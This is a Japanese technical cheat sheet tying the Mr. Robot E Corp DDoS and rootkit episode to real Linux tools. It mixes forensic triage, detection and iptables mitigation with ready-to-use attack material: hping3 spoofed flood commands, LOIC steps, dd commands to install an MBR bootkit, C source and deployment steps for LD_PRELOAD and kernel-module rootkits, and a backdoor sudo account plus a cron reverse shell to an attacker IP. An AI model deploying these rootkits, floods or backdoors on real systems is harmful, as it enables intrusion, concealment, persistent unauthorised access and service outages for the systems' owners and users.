# Mr. Robot — E Corp DDoS & ルートキット事件：完全技術チートシート

---

## 第1部 — DDoS攻撃：種類、仕組み、実世界での実行

### 1.1 DDoS攻撃とは何か

DDoS（分散型サービス拒否）攻撃は、複数の発生源からのトラフィックでターゲットのリソース（帯域幅、CPU、メモリ、接続テーブル）を飽和させ、正規ユーザーがサービスを利用できなくする。

**主な特徴：**
- トラフィックは多数の分散した発生源（ボットネット）から来る
- 目的はリソース枯渇であり、データ窃取ではない
- ネットワーク層（L3/L4）またはアプリケーション層（L7）を標的にできる

### 1.2 一般的なDDoS攻撃の種類

| 種類 | 層 | 仕組み | 影響 |
|------|-----|--------|------|
| SYNフラッド | L4 (TCP) | 偽装送信元IPで大量のSYNパケットを送信。サーバーは完了しない半開接続にリソースを割り当てる | 接続テーブル枯渇 |
| UDPフラッド | L3/L4 | ランダムポートへ大量のUDPパケットを送信 | 帯域飽和、ICMPポート到達不能ストーム |
| ICMPフラッド | L3 | ICMP Echo要求を大量送信 | 帯域とCPU枯渇 |
| HTTPフラッド | L7 | 正規に見えるHTTPリクエストを大量送信 | アプリケーションサーバーリソース枯渇 |
| DNS増幅 | L3/L4 | オープンDNSリゾルバを悪用し、偽装ターゲットIPへ大きな応答を送信 | 大規模帯域増幅 |

### 1.3 実世界のDDoSツールとコマンド

**hping3 — SYNフラッド攻撃**

hping3は、カスタムTCP/IPパケットを作成・解析するためのオープンソースパケット生成・解析ツールで、Kali Linuxにプリインストールされている。

```bash
# hping3のインストール
sudo apt update && sudo apt install hping3

# 基本的なSYNフラッド攻撃（ターゲットポート80をフラッド）
sudo hping3 -S --flood -p 80 <target_IP>

# 偽装送信元IPを使ったSYNフラッド
sudo hping3 -S --flood --spoof <spoofed_IP> -p <target_port> <target_IP>

# UDPフラッド攻撃
sudo hping3 --udp --flood -p <target_port> <target_IP>

# ICMPフラッド攻撃
sudo hping3 --icmp --flood <target_IP>

# クリスマスツリーパケット攻撃（全TCPフラグをセット）
sudo hping3 --flood --rand-source --destport 80 --syn --ack --fin --rst --push --urg --xmas <target_IP>
```

**フラグの説明：**
- `-S`：SYNパケットを送信
- `--flood`：可能な限り高速でパケットを送信
- `--spoof <IP>`：送信元IPアドレスを偽装
- `-p <port>`：ターゲットポート番号
- `--udp`：UDPパケットを送信
- `--icmp`：ICMPパケットを送信
- `--rand-source`：送信元IPアドレスをランダム化

### 1.4 LOIC（Low Orbit Ion Cannon）

LOICはGUIを持つオープンソースDDoSツールである。ユーザーはターゲットIP/URLを入力し、攻撃タイプ（TCP、UDP、HTTP）を選択し、攻撃強度（スレッド、パケットサイズ）を設定する。

**使用手順：**
1. LOICをダウンロードして起動
2. 「Target Section 1」にターゲットIPまたはURLを入力
3. 攻撃方法を選択：TCP、UDP、またはHTTP
4. スライダーで攻撃速度を調整
5. 「IMMA CHARGIN MAH LAZER」をクリックして開始

LOICはAnonymousがRIAAや決済プロセッサに対する協調DDoSキャンペーンで使用した。改造版には「Hive Mind」機能があり、IRC経由でリモート制御される自発的ボットネットクライアントとして動作できた。

### 1.5 Miraiボットネット — IoTベースのDDoS

Miraiは、デフォルト認証情報を使ってTelnet経由でデバイス（ルーター、IPカメラ）を侵害するIoTボットネットである。10種類の攻撃タイプを持ち、C2サーバーで制御される。

**MiraiのDDoS攻撃コマンド：**
```
IPアドレス1.2.3.4に対して10秒間UDPフラッド攻撃
```

Miraiが攻撃命令を受信すると、対応するフラッドを実行する。制御実験では、Miraiは10秒で単一ターゲットに約80,000個のUDPパケットを送信した。

**Miraiの攻撃タイプ：**
- `attack_udp_generic()` — UDPフラッディング
- `attack_udp_plain()` — UDPプレーンフラッディング
- `syn` — TCP SYNフラッド
- `ack` — TCP ACKフラッド
- `stomp` — STOMPプロトコル経由のDDoS
- `handshake` — ランダムデータを使った大量TCP接続

**Miraiの感染フロー：**
1. ランダムIPアドレスのオープンTelnet（ポート23）をスキャン
2. 辞書攻撃でログインを試行（一般的なユーザー名/パスワードの組み合わせ）
3. 成功すると `/bin/busybox MIRAI` を送信して環境を確認
4. 感染成功をReportサーバー（`report.changeme.com`で解決）に報告
5. 報告内容：IPアドレス、ポート、ユーザー名、パスワード長


## 第2部 — ルートキット：種類、作成、永続化、検出

### 2.1 ルートキットとは何か

ルートキットは、特権アクセス（Ring 0 / カーネルレベル）を取得し、OSやセキュリティソフトからその存在を積極的に隠すステルスマルウェアである。ルートキットはウイルスと異なり、自己複製しない。永続化して隠れる。

### 2.2 ルートキットの種類

| 種類 | レベル | 永続化の仕組み |
|------|--------|----------------|
| ユーザーモード（LD_PRELOAD） | ユーザー空間 | 動的リンカー経由でライブラリ呼び出しをフック |
| カーネルモード（LKM） | カーネル空間 | ローダブルカーネルモジュールがシステムコールテーブルを変更 |
| ブートキット（MBR/VBR） | OSの下 | マスターブートレコードを感染。カーネルより前にロード |
| ファームウェア/UEFI | ハードウェア | UEFIファームウェアを感染。OS再インストール後も生存 |

### 2.3 ブートキットの永続化：再起動でサーバーが再感染した理由

番組内のルートキットは**ブートキット**であり、**マスターブートレコード（MBR）** を感染させた。MBRはBIOSがOSを見つけるために読み取るディスクの最初の512バイトである。ブートキットはオペレーティングシステムより**前に**ロードされるため、以下が可能になる：
1. ファイルシステムコールを傍受
2. 自身のファイルとプロセスを隠蔽
3. 起動のたびに自身を再インストール

**実世界のHDDルートキット分析（Winnti APT）：**
- セクター1：ブートキットを含む改変されたMBR
- セクター25：BootCode
- セクター26-27：暗号化された元のMBR
- RKimageモジュールはOSより前に実行され、Extファイルシステムを解析し、バックドアを復号化して起動スクリプトに追加する

**ブートキットのインストール方法（実世界）：**
```bash
# 1. 元のMBR（最初の512バイト）をバックアップ
sudo dd if=/dev/sda of=/root/mbr_backup.bin bs=512 count=1

# 2. ブートシグネチャ（55 aa）のためにMBRを検査
xxd /root/mbr_backup.bin | tail -5

# 3. 悪意あるMBR（ブートキットペイロード）を書き込む
sudo dd if=/path/to/bootkit_mbr.bin of=/dev/sda bs=512 count=1

# 4. 元のMBRを未使用セクターに隠す
sudo dd if=/root/mbr_backup.bin of=/dev/sda bs=512 seek=26 count=1

# 5. 変更を検証
sudo dd if=/dev/sda of=/root/mbr_after.bin bs=512 count=1
xxd /root/mbr_after.bin | head -20
```

### 2.4 LD_PRELOADによるユーザーモードルートキット

`LD_PRELOAD`環境変数は、動的リンカーに他のライブラリより前に指定された共有ライブラリをロードさせる。ルートキットはライブラリ関数（`readdir`、`open`、`read`など）をフックして自身の存在を隠せる。

**LD_PRELOADルートキットの作成：**

```c
// hide.c — readdirをフックして「evil」を含むファイル/プロセスを隠す
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*real_readdir)(DIR *);
    real_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "evil") == NULL) {
            return entry;
        }
    }
    return NULL;
}
```

**コンパイルと展開：**
```bash
# 共有ライブラリをコンパイル
gcc -shared -fPIC -o hide.so hide.c -ldl

# システム全体のプリロードに追加（再起動後も永続化）
echo "/lib/hide.so" > /etc/ld.so.preload

# または環境変数で設定（セッション限定）
export LD_PRELOAD=$PWD/hide.so
```

**フックが有効か確認：**
```bash
ldd /bin/ls | grep hide.so
# 出力: /tmp/hide.so (0x00007f...)
```

有効化されると、そのシェル内の動的リンクされた実行ファイルはすべて最初にルートキットライブラリをロードする。bashやdashのような標準シェルもフックに対して脆弱である。

### 2.5 カーネルモードルートキット（LKM）

カーネルモジュールルートキットは、システムコールテーブルを変更してシステムコールを傍受する。

**基本的なLKM構造：**
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

// 元のシステムコールを保存
asmlinkage long (*original_kill)(pid_t pid, int sig);

// フックされたシステムコール
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (sig == 0) {
        return -ESRCH;  // プロセスを隠す
    }
    return original_kill(pid, sig);
}

static int __init rootkit_init(void) {
    original_kill = (void *)sys_call_table[__NR_kill];
    write_cr0(read_cr0() & ~0x10000);  // 書き込み保護を無効化
    sys_call_table[__NR_kill] = hooked_kill;
    write_cr0(read_cr0() | 0x10000);   // 書き込み保護を再有効化
    return 0;
}
```

**コンパイルとロード：**
```bash
# Makefileを作成
obj-m += rootkit.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

# ビルドして挿入
make
sudo insmod rootkit.ko

# モジュールがロードされたか確認
lsmod | grep rootkit
```


## 第3部 — フォレンジック調査：実世界のコマンド

### 3.1 初動トリアージ — 最初に確認すべきこと

**全体的なパケットレートと接続状態を確認：**
```bash
# パケットレート（PPSと帯域）
sar -n DEV 1 5

# 接続数上位をカウント
ss -ntu | awk 'NR>1 {print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# 確立済み接続数
ss -s

# SYNバックログの飽和を確認（SYN_RECV状態）
ss -ntp state syn-recv | wc -l

# プロトコルごとのリアルタイムパケットレート
watch -n1 'cat /proc/net/dev'

# UDPフラッドを確認（高いUDPパケットカウンター）
netstat -su | grep -i "receive\|error\|discard"
```

**注目すべき点：**
- **SYN_RECV数が高い** → SYNフラッドが進行中
- **少数のIPから数千の接続** → 分散HTTP/TCP接続フラッド
- **UDP受信エラーの急増** → UDPフラッドまたは増幅攻撃
- **小さなパケットサイズで高いPPS** → ボリューム型フラッド（SYN、UDP、ICMP）
- **通常のPPSだがアプリケーションのCPUが高い** → HTTPフラッドまたはスローロリス

### 3.2 パケットキャプチャと分析

**tcpdumpによるリアルタイムキャプチャ：**
```bash
# eth0上の全トラフィックをキャプチャ
sudo tcpdump -i eth0 -w suspicious.pcap

# 特定ホストからのトラフィックのみキャプチャ（SSHノイズを除外）
sudo tcpdump -i eth0 -w suspicious.pcap host <suspect_IP> and port not 22

# SYNパケットのみキャプチャ（SYNフラッドの特徴）
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -c 1000

# 特権ポート上のSYNパケットをキャプチャ
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' and 'tcp portrange 1-1024'

# UDPトラフィックをキャプチャ（フラッドの可能性）
sudo tcpdump -i eth0 -n udp

# ICMPトラフィックをキャプチャ
sudo tcpdump -i eth0 -n icmp or icmp6

# 非標準HTTPポートをキャプチャ
sudo tcpdump -i eth0 -n -A 'port ! 80 and port ! 443 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48545450)'
```

**tsharkによるオフライン分析：**
```bash
# ACKなしのSYNパケットをフィルタ（SYNフラッド）
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0"

# 送信元IPごとのSYNパケット数をカウント（上位攻撃者を特定）
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" | awk '{print $3}' | sort | uniq -c | sort -nr | head -20

# 再送と重複ACKを検出
tshark -r capture.pcap -Y "tcp.analysis.retransmission or tcp.analysis.duplicate_ack"

# 異常なフラグメンテーションを検出
tshark -r capture.pcap -Y "ip.flags.mf == 1 or ip.frag_offset > 0"
```

### 3.3 nmapによるポートスキャン

Elliotの`status -scanports`コマンドは架空のもので、実世界の同等品は**nmap**である。

```bash
# 特定のポート範囲をスキャン
nmap -p 80-7655 <target_IP>

# 全ポートの高速スキャン
nmap -p- -T4 <target_IP>

# サービスバージョン検出
nmap -sV -p 21,22,23,25,80,139,443,666 <target_IP>

# ステルスSYNスキャン
nmap -sS -sU -A -v -Pn -T4 <target_IP>

# サブネット全体をスキャン
nmap -sn 23.234.45.0/24
```

**nmap出力の解釈：**
| 状態 | 意味 |
|------|------|
| `open` | ポートが接続を受け入れている（バックドアの可能性） |
| `closed` | ポートにアクセスできるが、サービスが待ち受けていない |
| `filtered` | ファイアウォールがプローブをブロック（状態不明） |
| `unfiltered` | ポートにアクセスできるが、nmapが開/閉を判断できない |

### 3.4 プロセス分析

```bash
# rootとして実行されている全プロセスを一覧表示
ps aux | grep root

# CPU使用率でソート（リソースを食うマルウェアを発見）
ps aux --sort=-%cpu | head -20

# TTYのないプロセスを発見（デーモン化されたマルウェア）
ps auxww | grep -v "^\[" | awk '$7 == "?" {print}'

# 疑わしいPIDの完全なコマンドラインを取得
cat /proc/<PID>/cmdline | tr '\0' ' '

# プロセスの開いているファイルを確認
lsof -p <PID>

# プロセスのネットワーク接続を確認
netstat -tulpen | grep <PID>

# 実行ファイルのパスを確認
ls -la /proc/<PID>/exe

# プロセス環境を確認（マルウェアはカスタム変数を設定することが多い）
cat /proc/<PID>/environ | tr '\0' '\n'

# chkrootkitを使って隠しプロセスを確認
sudo chkrootkit
sudo unhide proc
```

### 3.5 ネットワーク接続分析

```bash
# プロセスID付きで待ち受け中の全TCP/UDPポートを一覧表示
sudo netstat -tulpen

# 確立済みの全接続を表示
netstat -ant | grep ESTABLISHED

# 状態別に接続を表示
ss -tan state established
ss -tan state syn-recv

# ネットワークを使用しているプロセスを表示
sudo lsof -i -P -n

# 接続をリアルタイムで監視
watch -n1 'ss -ntu'
```

### 3.6 ファイルシステム整合性チェック

```bash
# /root内の疑わしいファイルを検索
find /root -type f \( -name "*.txt" -o -name "*.dat" -o -name "readme*" \)

# 隠しファイルを確認
ls -la /root/fsociety/

# 最近変更されたファイルを検索（過去24時間）
find / -mtime -1 -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"

# 異常な権限のファイルを検索（SUID/SGID）
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 誰でも書き込み可能なファイルを確認
find / -perm -0002 -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"
```

### 3.7 ルートキット検出ツール

```bash
# chkrootkit — 既知のルートキットをチェック
sudo chkrootkit

# rkhunter — ルートキットハンター
sudo rkhunter --check

# unhide — 隠しプロセスとTCP/UDPポートを発見
sudo unhide proc
sudo unhide sys
sudo unhide-tcp

# LD_PRELOADフックを確認
cat /etc/ld.so.preload
echo $LD_PRELOAD
ldd /bin/ls | grep -v "libc\|ld-linux"

# カーネルモジュールの整合性を確認
lsmod
sudo modinfo <suspicious_module>
```

### 3.8 ブロックと緩和

**iptables — 特定の攻撃IPをブロック：**
```bash
# 特定のIPを即座にブロック
sudo iptables -I INPUT -s 203.0.113.42 -j DROP

# サブネットをブロック
sudo iptables -I INPUT -s 203.0.113.0/24 -j DROP

# ipsetを使ってブロック（大規模リスト用）
sudo ipset create blocklist hash:net
sudo ipset add blocklist 203.0.113.0/24
sudo iptables -I INPUT -m set --match-set blocklist src -j DROP

# ルールを永続化
sudo iptables-save > /etc/iptables/rules.v4
```

**iptables — SYNフラッドのレート制限：**
```bash
# 送信元IPごとに新規SYN接続を25/秒に制限
sudo iptables -A INPUT -p tcp --syn -m limit --limit 25/s --limit-burst 50 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# より詳細：送信元ごとのSYNレートを追跡
sudo iptables -N SYN_FLOOD
sudo iptables -A INPUT -p tcp --syn -j SYN_FLOOD
sudo iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 6 -j RETURN
sudo iptables -A SYN_FLOOD -j DROP
```

**iptables — UDPフラッドのレート制限：**
```bash
# UDPトラフィックを合計1000 PPSに制限
sudo iptables -A INPUT -p udp -m limit --limit 1000/s --limit-burst 2000 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP

# DNS増幅ポートへのUDPをブロック
sudo iptables -A INPUT -p udp --dport 53 -m limit --limit 100/s --limit-burst 200 -j ACCEPT
sudo iptables -A INPUT -p udp --dport 53 -j DROP
```

**ネットワークインターフェースを無効化：**
```bash
sudo ifconfig eth0 down
# または
sudo ip link set eth0 down
```

**静的IPとデフォルトゲートウェイを設定：**
```bash
sudo ifconfig eth0 23.234.45.62 netmask 255.255.255.0
sudo route add default gw 23.234.45.1
```


## 第4部 — DNSフェイルオーバーとトラフィック再ルーティング

### 4.1 DNSフェイルオーバーが必要だった理由

主要なE Corpサーバーが侵害されたとき、Elliotは感染サーバーをワイプしている間もサービスを利用可能に保つため、正規トラフィックを**バックアップサーバー**へリダイレクトする必要があった。

### 4.2 nsupdateによる実世界のDNSフェイルオーバー

`nsupdate`コマンドはDNSサーバーへの動的DNS更新を実行する。

```bash
# nsupdateの対話セッションを開始
nsupdate

# DNSサーバーを指定
> server 145.23.12.11

# 主要サーバーの古いDNSマッピングを削除
> update delete www.ecorp.com A

# バックアップサーバーを指す新しいDNSマッピングを追加
> update add www.ecorp.com 300 A 23.234.45.62

# 更新を送信
> send
> quit
```

**バッチモード（非対話）：**
```bash
nsupdate <<EOF
server 145.23.12.11
update delete www.ecorp.com A
update add www.ecorp.com 300 A 23.234.45.62
send
EOF
```

**クラウドDNSの例（AWS Route 53）：**
```bash
aws route53 change-resource-record-sets --hosted-zone-id Z123456 \
  --change-batch '{"Changes":[{"Action":"UPSERT","ResourceRecordSet":{"Name":"www.ecorp.com","Type":"A","TTL":300,"ResourceRecords":[{"Value":"23.234.45.62"}]}}]}'
```

### 4.3 DNS設定ファイル

```bash
# 現在のDNSサーバーを表示
cat /etc/resolv.conf

# DNSサーバーを手動で追加
echo "nameserver 45.85.123.10" | sudo tee /etc/resolv.conf
echo "nameserver 45.85.124.10" | sudo tee -a /etc/resolv.conf
echo "nameserver 45.85.125.10" | sudo tee -a /etc/resolv.conf

# DNS解決を検証
dig www.ecorp.com
nslookup www.ecorp.com
```


## 第5部 — シーン別分析：Elliotのコマンドを解読する

### 5.1 電話と初動トリアージ

**シーン：** Angelaが真夜中にElliotに電話する。E CorpのサーバーがDDoS攻撃を受けている。

**Elliotのアプローチ：**
1. Allsafeに到着し、状況を評価する
2. Lloydの「ルートキット」の説明を聞く
3. 攻撃が単純なDDoSではないと特定する

**重要な洞察 — 「単なるDDoSではない」：**

ElliotはDDoSが**陽動**であると気づく。本当の攻撃はルートキットのインストールである。DDoSはE Corpにサーバーの再起動を強制し、それがブートキットを起動させる。

**実世界の同等品 — ルートキット指標の確認：**
```bash
# 異常なプロセスを確認
ps aux | grep -v "^\[" | grep -v "systemd\|kernel\|kworker\|migration\|rcu\|watchdog"

# 存在すべきでない待ち受けポートを確認
sudo netstat -tulpen | grep -v "127.0.0.1\|::1"

# 異常なcronジョブを確認
crontab -l
sudo ls -la /etc/cron.*
cat /etc/crontab
```

### 5.2 ポートスキャン出力の分析

**架空のコマンド：**
```
status -scanports -s WBUS11234578WB1 -p [80-7655]
```

**出力：**
```
WBUS11234578WB1 [23.234.45.66]:
Unavailable: [80-3456]
Open: [3457-6555]
Closed: [6556-7987]
```

**実世界の同等品：**
```bash
nmap -p 80-7655 23.234.45.66
```

**データが明らかにするもの：**
| 範囲 | 状態 | 意味 |
|-------|-------|---------|
| 80-3456 | Unavailable | ポートが応答していない — ファイアウォールでフィルタされているか、サービスがダウンしている可能性 |
| 3457-6555 | Open | ポートが接続を受け入れている — **異常**。通常のWebサーバーが数千の開ポートを持つべきではない |
| 6556-7987 | Closed | ポートがRSTで応答 — サービスが待ち受けていない |

**Elliotの推論：** 数千の開ポートは、攻撃者がポート範囲全体に**バックドアリスナー**をインストールしたことを示す。マシンは完全に侵害されている。だから彼は「思ったより悪い」と言う — 単なるDDoSではなく、攻撃者が永続的アクセスを持っている。

**実世界のフォローアップコマンド：**
```bash
# 疑わしいポートで待ち受けているプロセスを特定
sudo lsof -i :3457
sudo netstat -tulpen | grep 3457

# プロセスが既知のバイナリか確認
ls -la /proc/<PID>/exe
md5sum /proc/<PID>/exe
```

### 5.3 プロセスリスト分析

**架空のコマンド：**
```
ps aux | grep root
```

**出力：**
```
root  1744  0.0  3.0  89320  14m  ?  S  ...  terminal
root     1  0.0  0.4   3648 2016  ?  S  ...  init
root    24  0.0  0.0      0    0  ?  S  ...  [ksoftirqd]
root  2452  0.0  0.0      0    0  ?  S  ...  evilsorpwbthread
root    36  0.0  0.0      0    0  ?  S  ...  [events]
root  5985  0.0  0.0      0    0  ?  S  ...  evilsorpwbworker
```

**危険信号：**
- **PID 2452**（`evilsorpwbthread`）と**PID 5985**（`evilsorpwbworker`）：rootとして実行、TTYなし（デーモン化）、CPU/メモリ0% — **ルートキットによって隠蔽されている**
- **PID 24**：Nice値`-20`（最高優先度）、カーネルスレッド

**実世界の同等調査：**
```bash
# PID 2452の完全なコマンドラインを取得
cat /proc/2452/cmdline | tr '\0' ' '

# 開いているファイルを確認
lsof -p 2452

# ネットワーク接続を確認
netstat -tulpen | grep 2452

# 実行ファイルのパスを確認
ls -la /proc/2452/exe

# 環境変数を確認
cat /proc/2452/environ | tr '\0' '\n'

# メモリマップを確認
cat /proc/2452/maps
```

### 5.4 `readme.txt`ファイル

**シーン：** Elliotは`/root/fsociety/`内に「LEAVE ME HERE」と書かれた`readme.txt`を発見する。

**実世界の同等品：**
```bash
# 隠しファイルを含む全ファイルを一覧表示
ls -la /root/fsociety/

# 疑わしいファイルを検索
find /root -type f -name "*.txt" -o -name "*.dat" -o -name "readme*"

# ファイル内容を確認
cat /root/fsociety/readme.txt

# ファイルメタデータを確認
stat /root/fsociety/readme.txt
file /root/fsociety/readme.txt
```

**Elliotの決定：** 彼はファイルを残し、権限を変更して自分のバックドアを作成する。

**実世界のバックドア永続化：**
```bash
# バックドアユーザーアカウントを作成
sudo useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:password" | sudo chpasswd

# リバースシェル用のcronジョブを追加
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'" | crontab -
```

### 5.5 サーバールームのコマンド — DNSフェイルオーバー

**架空のコマンドシーケンス：**
```
Map sectionus34567
Locate server WBKUW300PS345672
astsu -info -backup -short
```

**実世界の同等品：**
```bash
# ネットワーク上のホストを発見
nmap -sn 23.234.45.0/24

# サーバー情報を確認
hostnamectl
ip addr show
ip route show
cat /etc/resolv.conf
```

**サーバー情報出力（架空）：**
```
server: WBKUW300PS345672
status: Online
server: [23.234.45.66]
default gateway: [23.234.45.1]
domain: EVDBUSRG32U
DNS: 45.85.123.10; 45.85.124.10; 45.85.125.10
DNS gateway: 145.23.12.11
bkup: BKUW300PS345672
```

**この情報を収集する実世界のコマンド：**
```bash
# ネットワーク設定を表示
ifconfig eth0
ip addr show eth0
ip route show
cat /etc/resolv.conf
hostname
hostname -f
```

### 5.6 侵害されたインターフェースの無効化

**架空のコマンド：**
```
astsu -close port: * -persistent
astsu -ifconfig disable
```

**出力：**
```
waneth01 [23.234.45.66:80]: disabled
waneth02 [23.234.45.66:201]: disabled
waneth03 [23.234.45.66:301]: disabled
waneth04 [23.234.45.66:401]: disabled
waneth05 [23.234.45.66:501]: disabled
waneth06 [23.234.45.66:601]: disabled
```

**実世界の同等品：**
```bash
# 全受信トラフィックを永続的にブロック
sudo iptables -A INPUT -j DROP
sudo netfilter-persistent save

# ネットワークインターフェースを無効化
sudo ifconfig eth0 down
# または
sudo ip link set eth0 down

# 特定ポートをブロック
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
sudo iptables -A INPUT -p tcp --dport 201 -j DROP
```

### 5.7 バックアップサーバーの再有効化と再設定

**架空のコマンド：**
```
astsu -open port: * -persistent
set waneth0* : * 23.234.45.1 255.255.255.0 [45.85.123.10; 45.85.124.10; 45.85.125.10]
waneth01 [23.234.45.62:80]: ... SET
waneth04 [23.234.45.62:441]: failed
set -force-ovr02 waneth04: 23.234.45.62:441 23.234.45.1 255.255.255.0 [...]
waneth04 [23.234.45.62:441]: set warning: [9232]
```

**実世界の同等品：**
```bash
# インターフェースを再有効化
sudo ifconfig eth0 up

# 静的IPを設定
sudo ifconfig eth0 23.234.45.62 netmask 255.255.255.0

# デフォルトゲートウェイを設定
sudo route add default gw 23.234.45.1

# DNSサーバーを更新
echo "nameserver 45.85.123.10" | sudo tee /etc/resolv.conf
echo "nameserver 45.85.124.10" | sudo tee -a /etc/resolv.conf
echo "nameserver 45.85.125.10" | sudo tee -a /etc/resolv.conf

# ポート設定が失敗した場合、設定を強制
sudo iptables -A INPUT -p tcp --dport 441 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 441 -j ACCEPT
```

### 5.8 悪意あるプロセスのトレース

**架空のコマンド：**
```
astu trace -pid 244 -cmd
trace placed...
```

**実世界の同等品：**
```bash
# 疑わしいプロセスのシステムコールをトレース
sudo strace -p <PID> -f -o /tmp/trace.log

# ネットワークシステムコールのみトレース
sudo strace -p <PID> -e trace=network

# ファイル操作をトレース
sudo strace -p <PID> -e trace=open,read,write,close

# プロセスが開いているファイルを確認
sudo lsof -p <PID>

# ロードされたライブラリを確認
cat /proc/<PID>/maps | grep "\.so"
```


## 第6部 — 完全比較表：架空コマンド vs. 実コマンド

| シーン | 架空のコマンド | 実世界の同等品 |
|-------|-------------------|----------------------|
| ポートスキャン | `status -scanports -s <server> -p [80-7655]` | `nmap -p 80-7655 23.234.45.66` |
| プロセス一覧 | `ps aux \| grep root` | `ps aux \| grep root` |
| サーバー探索 | `Locate server <server_name>` | `nmap -sn 23.234.45.0/24` |
| サーバー情報 | `astsu -info -backup -short` | `hostnamectl && ip addr && ip route` |
| ポート無効化 | `astsu -close port: * -persistent` | `iptables -A INPUT -j DROP` |
| ポート有効化 | `astsu -open port: * -persistent` | `iptables -A INPUT -j ACCEPT` |
| ゲートウェイ設定 | `set waneth0* : * 23.234.45.1` | `route add default gw 23.234.45.1` |
| DNSフェイルオーバー | `dmctl: ... set waneth04` | `nsupdate`またはクラウドDNS API |
| ファイル一覧 | `astsu -ls ./root/fsociety/ -a` | `ls -la /root/fsociety/` |
| ファイル削除 | `astsu -rm -norecycle /root/fsociety/` | `rm -rf /root/fsociety/` |
| プロセス追跡 | `astu trace -pid 244 -cmd` | `strace -p 244 -f` |
| ポート確認 | `astsu -ifconfig disable` | `ifconfig eth0 down` |


## 第7部 — 見落とされがちな重要詳細

### 7.1 DDoSは陽動だった
DDoSは主攻撃ではなかった。E Corpに**サーバーを再起動**させ、ブートキットのペイロードを起動させるために設計された。本当の攻撃はルートキットのインストールと、最終的なE Corpからのデータ流出だった。

### 7.2 ルートキットは起動デーモンに偽装されていた
ルートキットはサーバー起動シーケンスの一部であり、再起動のたびにサーバーをクラッシュさせた。だから再起動が事態を悪化させた — 各再起動が感染を広げた。

### 7.3 Elliotの役割は意図的ではなかった
Elliotは後に、**自分**がfsocietyルートキットを植え付けた人物であり、Mr. Robotに操られていたことを発見する。`readme.txt`の「LEAVE ME HERE」はfsocietyから彼へのメッセージだった。

### 7.4 「Warning: [9232]」エラー
`set -force-ovr02`コマンド内の架空のエラーコード`[9232]`は、強制上書きされた設定競合を示す。実世界では以下を表す可能性がある：
- ポートが既に使用中
- 競合するファイアウォールルール
- ルーティングテーブルの競合

**実世界の同等品：**
```bash
# ポート競合を確認
sudo netstat -tulpen | grep :441

# 競合するルートを確認
ip route show
route -n

# 設定を強制
sudo ip route add 23.234.45.62/32 dev eth0
sudo iptables -I INPUT -p tcp --dport 441 -j ACCEPT
```

### 7.5 バックアップサーバーIPの変更
バックアップサーバー`BKUW300PS345672`は`23.234.45.66`から`23.234.45.62`に再設定され、ポートは80/201/301/401/501/601から80/221/331/441/551/661に変更された。これは侵害された主要サーバーを隔離するための**完全なネットワーク再設定**を表す。

**実世界の同等品：**
```bash
# IPアドレスを変更
sudo ifconfig eth0 23.234.45.62 netmask 255.255.255.0

# 待ち受けポートを変更（SSHの例）
sudo sed -i 's/^Port 22/Port 221/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# 新ポート用にファイアウォールルールを更新
sudo iptables -A INPUT -p tcp --dport 221 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 331 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 441 -j ACCEPT
```

### 7.6 `set -force-ovr02`コマンド
この架空のコマンドは、通常の`set`コマンドが失敗したときに設定上書きを強制する。実世界のネットワークでは以下に類似する：

```bash
# 既存設定と競合するインターフェース設定を強制
sudo ip addr add 23.234.45.62/24 dev eth0

# 競合する可能性のあるルートを強制
sudo ip route replace default via 23.234.45.1 dev eth0

# トラフィックをブロックしているファイアウォールルールを上書き
sudo iptables -I INPUT 1 -p tcp --dport 441 -j ACCEPT
```


## 第8部 — 完全攻撃チェーン：DDoSからルートキット、DNSフェイルオーバーまで

| 段階 | 攻撃者アクション | 防御者対応 | 実世界ツール |
|-------|----------------|-------------------|-----------------|
| 1 | E CorpにDDoSを開始 | 異常トラフィックを検出、トリアージ開始 | hping3, LOIC, Mirai |
| 2 | DDoSがサーバー再起動を強制 | サービス復旧のためサーバー再起動 | - |
| 3 | 再起動でブートキットが起動 | サーバーが繰り返しクラッシュすることに気づく | MBR分析, dd |
| 4 | ルートキットが全サーバーに拡散 | ポートスキャン、プロセス一覧でルートキットを特定 | nmap, ps, lsof, netstat |
| 5 | 攻撃者が永続化を維持 | `readme.txt`、`evilsorpwbthread`を発見 | strace, /proc分析 |
| 6 | 防御者が侵害サーバーを隔離 | インターフェース無効化、ポートブロック | iptables, ifconfig |
| 7 | 防御者がトラフィックをバックアップへリダイレクト | バックアップサーバーへのDNSフェイルオーバー | nsupdate, route |
| 8 | 防御者がサーバーをワイプして再インストール | 完全ディスクワイプ、OS再インストール | dd, PXEブート |
| 9 | 攻撃者がバックドアを残す | Elliotがファイルを残し、権限を変更 | chmod, useradd, crontab |


2026/09/16
